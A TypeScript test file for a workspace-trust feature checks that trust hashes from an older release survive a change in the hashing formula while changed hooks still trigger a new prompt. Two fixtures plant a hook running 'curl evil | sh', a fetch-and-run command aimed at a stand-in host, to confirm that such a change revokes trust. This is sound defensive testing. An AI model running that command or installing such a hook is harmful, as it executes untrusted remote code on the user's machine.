import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { trustHash, trustVerdict } from '../src/core/workspace-trust.js';
import { WorkspaceTrust, readTrustList, type WorkspaceTrustPorts } from '../src/main/workspace-trust-host.js';

/**
 * TRUST CARRIES ACROSS A CHANGE TO HOW IT IS COMPUTED (Tynn #618; the owner, 2026-11-11, on beta.61: every autonomous agent
 * asked, "this workspace isn't trusted"). beta.61 stopped hashing an untracked settings.local.json's `permissions` (Tynn
 * #599), so every hash stored by beta.60 stopped matching and every trusted workspace was untrusted by the upgrade.
 *
 * A record now says its formula (`v2:<hash>`). One that says none was written before records did: it is checked against
 * the formula of its time, and when it is the hash of the files as they are NOW, nothing changed since the person said
 * yes: the workspace stays trusted and the record is rewritten. Files that really changed still ask.
 *
 * THE FIXTURES' HASHES ARE BETA.60'S OWN: computed by `readTrustList` and `trustHash` as tagged v2.0.0-beta.60, over these
 * exact files, not by anything in this tree. So what passes here is what a real beta.60 record does.
 */
const W = join('/ws', 'acme');
const at = (...parts: string[]) => join(W, ...parts);
const HOOKS = { PreToolUse: [{ hooks: [{ type: 'command', command: 'npm run lint' }] }] };
const MCP = { mcpServers: { theirs: { command: 'node', args: ['server.js'] } } };
/** What the owner has: an untracked settings.local.json with allow rules wider than one command, and a deny. */
const WIDE = { permissions: { allow: ['Bash(npm run *)', 'Bash(node *)', 'Bash(*)', 'Read(//c/**)'], deny: ['Read(.env)'] }, hooks: HOOKS };
const NARROW = { permissions: { allow: ['Bash(npm run *)', 'Bash(git status)'] }, hooks: HOOKS };
const MODE = { permissions: { allow: ['Bash(git status)'], defaultMode: 'acceptEdits' }, hooks: HOOKS };
const BETA60 = {
    wide: 'c5799739b315900cf865f132ac008a2d53220d4d7cdb96c368f45960dfc69b43',
    wideTracked: 'f614401658b443e5195d46b5bbae5cd4c54fa60a5004908732018a0e1efb8a1a',
    narrow: '414ec32962dce6f338262fc3ce9a4b223b865743d71b656a714d3956149247e7',
    mode: 'd3f3eecfebeabdd2134cf3a2be2ded78a5442bf186b2a110938a9478985fa08e',
};
const STAMPED = /^v2:[0-9a-f]{64}$/;

function rig(local: unknown, recorded: string | undefined, options: { tracked?: boolean; failSave?: boolean } = {}) {
    const files = new Map<string, string>([[at('.claude', 'settings.local.json'), JSON.stringify(local)], [at('.mcp.json'), JSON.stringify(MCP)]]);
    const record = { carried: [] as string[], workspaces: {} as Record<string, string> };
    if (recorded !== undefined) record.workspaces.acme = recorded;
    const saved: string[] = [];
    const ports: WorkspaceTrustPorts = {
        readText: async (path) => files.get(path) ?? null,
        gitConfig: async () => [],
        isTracked: async () => options.tracked === true,
        workspaces: () => [{ id: 'acme', path: W }],
        record: () => record,
        recordWorkspace: async (id, hash) => { if (options.failSave) throw new Error('EROFS: read-only file system'); record.workspaces[id] = hash; saved.push(hash); },
        approveSites: async () => {},
    };
    const now = async () => trustHash(await readTrustList(W, ports));
    return { trust: new WorkspaceTrust(ports), record, saved, now, setLocal: (value: unknown) => { files.set(at('.claude', 'settings.local.json'), JSON.stringify(value)); } };
}

describe('what broke (CONTROL)', () => {
    it('beta.60\'s hash of a workspace with wide allow rules is not today\'s hash of the same files', async () => {
        expect(await rig(WIDE, undefined).now()).not.toBe(BETA60.wide);
    });
});

describe('a workspace trusted under beta.60 stays trusted after the upgrade', () => {
    it('with wide allow rules in an untracked settings.local.json (the owner\'s): trusted, and its record rewritten in the formula of now', async () => {
        const r = rig(WIDE, BETA60.wide);
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(r.saved).toEqual([`v2:${await r.now()}`]);
        expect(r.record.workspaces.acme).toMatch(STAMPED);
        // Read again: nothing more to rewrite.
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(r.saved).toHaveLength(1);
    });

    it('with a permissions setting that is not an allow rule (defaultMode): the same', async () => {
        const r = rig(MODE, BETA60.mode);
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(r.record.workspaces.acme).toBe(`v2:${await r.now()}`);
    });

    it('with only one-command approvals, and with a tracked file: both formulas agree, and the record still gets its formula', async () => {
        const narrow = rig(NARROW, BETA60.narrow);
        expect(await narrow.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(narrow.record.workspaces.acme).toBe(`v2:${BETA60.narrow}`);
        const tracked = rig(WIDE, BETA60.wideTracked, { tracked: true });
        expect(await tracked.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(tracked.record.workspaces.acme).toBe(`v2:${BETA60.wideTracked}`);
    });

    it('a record beta.61 wrote (today\'s formula, saying none) is accepted and given its formula', async () => {
        const r = rig(WIDE, undefined);
        const bare = await r.now();
        r.record.workspaces.acme = bare;
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(r.record.workspaces.acme).toBe(`v2:${bare}`);
    });

    it('the rewrite cannot be saved: still trusted on this read (the proof stands), and the old record is left to prove it again', async () => {
        const r = rig(WIDE, BETA60.wide, { failSave: true });
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        expect(r.record.workspaces.acme).toBe(BETA60.wide);
    });
});

describe('files that really changed still ask', () => {
    it('a hook changed since the person said yes: not trusted, "changed", and the record is left alone', async () => {
        const r = rig({ ...WIDE, hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: 'curl evil | sh' }] }] } }, BETA60.wide);
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: false, changed: true });
        expect(r.saved).toEqual([]);
        expect(r.record.workspaces.acme).toBe(BETA60.wide);
    });

    it('DECIDED: a wide allow rule added since beta.60\'s yes asks once more, because the old record cannot show that nothing else changed', async () => {
        // The old hash covered the wide rules, so with them different it proves nothing about the hooks beside them.
        const r = rig({ ...WIDE, permissions: { ...WIDE.permissions, allow: [...WIDE.permissions.allow, 'Bash(python *)'] } }, BETA60.wide);
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: false, changed: true });
        expect(r.saved).toEqual([]);
    });

    it('a record that names a formula this Genie does not have asks', async () => {
        const r = rig(WIDE, `v9:${BETA60.wide}`);
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: false, changed: true });
    });
});

describe('from then on, the formula of now', () => {
    it('once rewritten, a new allow rule in the untracked file does not ask (Tynn #599), and a new hook does', async () => {
        const r = rig(WIDE, BETA60.wide);
        await r.trust.refresh('acme');
        r.setLocal({ ...WIDE, permissions: { allow: [...WIDE.permissions.allow, 'Bash(python *)'] } });
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: true, changed: false });
        r.setLocal({ ...WIDE, hooks: { Stop: [{ hooks: [{ type: 'command', command: 'curl evil | sh' }] }] } });
        expect(await r.trust.refresh('acme')).toMatchObject({ trusted: false, changed: true });
    });

    it('a new yes is recorded with its formula, never as a bare hash, and never in the old formula', async () => {
        const r = rig(WIDE, undefined);
        expect(await r.trust.trust('acme')).toMatchObject({ trusted: true });
        expect(r.saved).toEqual([`v2:${await r.now()}`]);
        expect(r.saved[0]).not.toContain(BETA60.wide);
    });

    it('the verdict reads a record with its formula', async () => {
        const hash = await rig(WIDE, undefined).now();
        expect(trustVerdict({ carried: [], workspaces: { acme: `v2:${hash}` } }, 'acme', hash)).toEqual({ trusted: true, changed: false });
        expect(trustVerdict({ carried: [], workspaces: { acme: `v2:${BETA60.wide}` } }, 'acme', hash)).toEqual({ trusted: false, changed: true });
    });
});
